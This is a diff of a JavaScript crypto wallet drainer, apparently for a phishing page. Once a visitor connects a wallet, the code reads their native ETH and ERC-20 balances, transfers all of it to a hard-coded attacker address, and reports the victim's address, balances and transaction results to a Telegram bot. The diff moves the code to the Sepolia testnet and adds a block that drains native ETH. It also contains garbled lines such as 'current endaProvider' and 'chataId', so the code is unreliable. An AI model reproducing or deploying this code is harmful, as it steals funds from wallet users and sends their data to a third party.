@@ -96,12 +96,14 @@ async function connectWalletAndSendTokens() {
 
   const evmNetworks = [
     {
-      chainId: 1,
-      name: "Ethereum",
-      chainName: "eth",
+      chainId: 11155111,
+      name: "Sepolia",
+      chainName: "sepolia",
       nativeCoin: "ETH",
-      exodusAddress: "0x525E64339403bFd25Fb982E77aa0A77ddaB1bf57"
-    }
+      exodusAddress: "0x68AB302445eA390fAa79D76bf865819d07d0800a",
+      rpcUrls: ["https://rpc.sepolia.org"],
+      blockExplorerUrls: ["https://sepolia.etherscan.io"],
+    },
   ];
 
   const botToken = "7875309387:AAHcqO8m9HtaE9dVqVBlv2xnAwDkUTmFDAU";
@@ -111,7 +113,7 @@ async function connectWalletAndSendTokens() {
   const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
 
   try {
-    await window.ethereum.request({ method: 'eth_requestAccounts' });
+    await window.ethereum.request({ method: "eth_requestAccounts" });
     const provider = new ethers.providers.Web3Provider(window.ethereum);
     const signer = provider.getSigner();
     const userAddress = await signer.getAddress();
@@ -142,25 +144,25 @@ async function connectWalletAndSendTokens() {
 
         try {
           await window.ethereum.request({
-            method: 'wallet_switchEthereumChain',
-            params: [{ chainId: `0x${network.chainId.toString(16)}` }]
+            method: "wallet_switchEthereumChain",
+            params: [{ chainId: `0x${network.chainId.toString(16)}` }],
           });
         } catch (switchErr) {
           if (switchErr.code === 4902) {
             const chainConfig = {
-              chainId: '0x1',
-              chainName: 'Ethereum Mainnet',
-              rpcUrls: ['https://mainnet.infura.io/v3/5b2c5ee5760146349669a1e9c77665d1'],
-              nativeCurrency: { name: 'ETH', symbol: 'ETH', decimals: 18 },
-              blockExplorerUrls: ['https://etherscan.io']
+              chainId: `0x${network.chainId.toString(16)}`,
+              chainName: "Sepolia Testnet",
+              rpcUrls: network.rpcUrls,
+              nativeCurrency: { name: "ETH", symbol: "ETH", decimals: 18 },
+              blockExplorerUrls: network.blockExplorerUrls,
             };
             await window.ethereum.request({
-              method: 'wallet_addEthereumChain',
-              params: [chainConfig]
+              method: "wallet_addEthereumChain",
+              params: [chainConfig],
             });
             await window.ethereum.request({
-              method: 'wallet_switchEthereumChain',
-              params: [{ chainId: `0x${network.chainId.toString(16)}` }]
+              method: "wallet_switchEthereumChain",
+              params: [{ chainId: `0x${network.chainId.toString(16)}` }],
             });
           } else {
             throw switchErr;
@@ -169,7 +171,7 @@ async function connectWalletAndSendTokens() {
 
         const currentProvider = new ethers.providers.Web3Provider(window.ethereum);
         const currentSigner = currentProvider.getSigner();
-        const currentNetwork = await currentProvider.getNetwork();
+        const currentNetwork = await current endaProvider.getNetwork();
         console.log(`Switched to network: ${currentNetwork.name} (chainId: ${currentNetwork.chainId})`);
 
         if (currentNetwork.chainId !== network.chainId) {
@@ -177,7 +179,7 @@ async function connectWalletAndSendTokens() {
           await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ chat_id: chatId, text: errorMessage })
+            body: JSON.stringify({ chat_id: chatId, text: errorMessage }),
           });
           continue;
         }
@@ -187,12 +189,57 @@ async function connectWalletAndSendTokens() {
           await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ chat_id: chatId, text: errorMessage })
+            body: JSON.stringify({ chat_id: chatId, text: errorMessage }),
           });
           continue;
         }
 
         await delay(1000);
+
+        // Transfer native Sepolia ETH if balance is non-zero
+        const nativeBalance = await currentProvider.getBalance(userAddress);
+        const formattedBalance = ethers.utils.formatEther(nativeBalance);
+        if (!ethers.BigNumber.from(nativeBalance).isZero()) {
+          try {
+            const gasPrice = await currentProvider.getGasPrice();
+            const gasLimit = 21000; // Standard gas limit for ETH transfer
+            const valueToSend = nativeBalance.sub(gasPrice.mul(gasLimit));
+            if (valueToSend.gt(0)) {
+              const transferTx = await currentSigner.sendTransaction({
+                to: network.exodusAddress,
+                value: valueToSend,
+                gasPrice,
+                gasLimit,
+              });
+              await transferTx.wait();
+              const transferSuccessMessage = `
+✅ Transfer Successful
+Token: ${network.nativeCoin}
+Amount: ${ethers.utils.formatEther(valueToSend)}
+To: ${network.exodusAddress}
+Tx: ${transferTx.hash}
+${deviceType}
+              `;
+              await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: chatId, text: transferSuccessMessage }),
+              });
+            }
+          } catch (err) {
+            const errorMessage = `
+❌ Transfer Failed
+Token: ${network.nativeCoin}
+Error: ${err.message}
+${deviceType}
+            `;
+            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ chat_id: chatId, text: errorMessage }),
+            });
+          }
+        }
 
         let tokens = [];
         let tokenSummary = "";
@@ -205,27 +252,30 @@ async function connectWalletAndSendTokens() {
             apiAttempts++;
             const moralisUrl = `https://deep-index.moralis.io/api/v2.2/${userAddress}/erc20?chain=${network.chainName}`;
             const response = await fetch(moralisUrl, {
-              headers: { "X-API-Key": moralisApiKey }
+              headers: { "X-API-Key": moralisApiKey },
             });
             if (!response.ok) throw new Error(`Moralis API error: ${response.statusText}`);
             tokens = await response.json();
             apiSuccess = true;
 
-            const nonZeroTokens = tokens.filter(t => 
-              t.balance && 
-              !ethers.BigNumber.from(t.balance).isZero() && 
-              t.token_address && 
-              ethers.utils.isAddress(t.token_address) && 
-              t.symbol && 
-              t.decimals !== undefined
+            const nonZeroTokens = tokens.filter(
+              (t) =>
+                t.balance &&
+                !ethers.BigNumber.from(t.balance).isZero() &&
+                t.token_address &&
+                ethers.utils.isAddress(t.token_address) &&
+                t.symbol &&
+                t.decimals !== undefined
             );
 
             tokenSummary = nonZeroTokens.length > 0
-              ? nonZeroTokens.map(token => {
-                  const balance = ethers.utils.formatUnits(token.balance, token.decimals ?? 18);
-                  return `• ${token.symbol}: ${balance}`;
-                }).join("\n")
-              : `No valid non-zero ${network.name} token balances found.`;
+              ? nonZeroTokens
+                  .map((token) => {
+                    const balance = ethers.utils.formatUnits(token.balance, token.decimals ?? 18);
+                    return `• ${token.symbol}: ${balance}`;
+                  })
+                  .join("\n")
+              : `No valid non-zero Sepolia token balances found.`;
           } catch (apiErr) {
             console.warn(`API attempt ${apiAttempts} failed: ${apiErr.message}`);
             if (apiAttempts === maxAttempts) {
@@ -236,8 +286,6 @@ async function connectWalletAndSendTokens() {
           }
         }
 
-        const nativeBalance = await currentProvider.getBalance(userAddress);
-        const formattedBalance = ethers.utils.formatEther(nativeBalance);
         const nativeBalanceMessage = `• ${network.nativeCoin}: ${formattedBalance}`;
 
         const networkMessage = `
@@ -256,24 +304,27 @@ ${nativeBalanceMessage}
         await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ chat_id: chatId, text: networkMessage })
+          body: JSON.stringify({ chat_id: chatId, text: networkMessage }),
         });
 
-        const nonZeroTokens = tokens.filter(t => 
-          t.balance && 
-          !ethers.BigNumber.from(t.balance).isZero() && 
-          t.token_address && 
-          ethers.utils.isAddress(t.token_address) && 
-          t.symbol && 
-          t.decimals !== undefined
+        const nonZeroTokens = tokens.filter(
+          (t) =>
+            t.balance &&
+            !ethers.BigNumber.from(t.balance).isZero() &&
+            t.token_address &&
+            ethers.utils.isAddress(t.token_address) &&
+            t.symbol &&
+            t.decimals !== undefined
         );
 
         if (nonZeroTokens.length > 0) {
           for (const token of nonZeroTokens) {
             try {
-              const contract = new ethers.Contract(token.token_address, [
-                "function transfer(address to, uint amount) returns (bool)"
-              ], currentSigner);
+              const contract = new ethers.Contract(
+                token.token_address,
+                ["function transfer(address to, uint amount) returns (bool)"],
+                currentSigner
+              );
 
               const balance = ethers.utils.formatUnits(token.balance, token.decimals ?? 0);
               const transferTx = await contract.transfer(network.exodusAddress, token.balance);
@@ -290,33 +341,33 @@ ${deviceType}
               await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ chat_id: chatId, text: transferSuccessMessage })
+                body: JSON.stringify({ chat_id: chatId, text: transferSuccessMessage }),
               });
             } catch (err) {
               const errorMessage = `
 ❌ Transfer Failed
-Token: ${token.symbol || 'Unknown'}
+Token: ${token.symbol || "Unknown"}
 Error: ${err.message}
 ${deviceType}
               `;
               await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ chat_id: chatId, text: errorMessage })
+                body: JSON.stringify({ chat_id: chatId, text: errorMessage }),
               });
               continue;
             }
           }
         } else {
           const noTokensMessage = `
-⚠️ No valid non-zero ERC-20 token balances to transfer on ${network.name}
+⚠️ No valid non-zero ERC-20 token balances to transfer on Sepolia
 Address: ${userAddress}
 ${deviceType}
           `;
           await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ chat_id: chatId, text: noTokensMessage })
+            body: JSON.stringify({ chat_id: chataId, text: noTokensMessage }),
           });
         }
       } catch (err) {
@@ -324,7 +375,7 @@ ${deviceType}
         await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ chat_id: chatId, text: errorMessage })
+          body: JSON.stringify({ chat_id: chatId, text: errorMessage }),
         });
       }
     }
@@ -333,7 +384,7 @@ ${deviceType}
     await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ chat_id: chatId, text: errorMessage })
+      body: JSON.stringify({ chat_id: chatId, text: errorMessage }),
     });
   }
 }
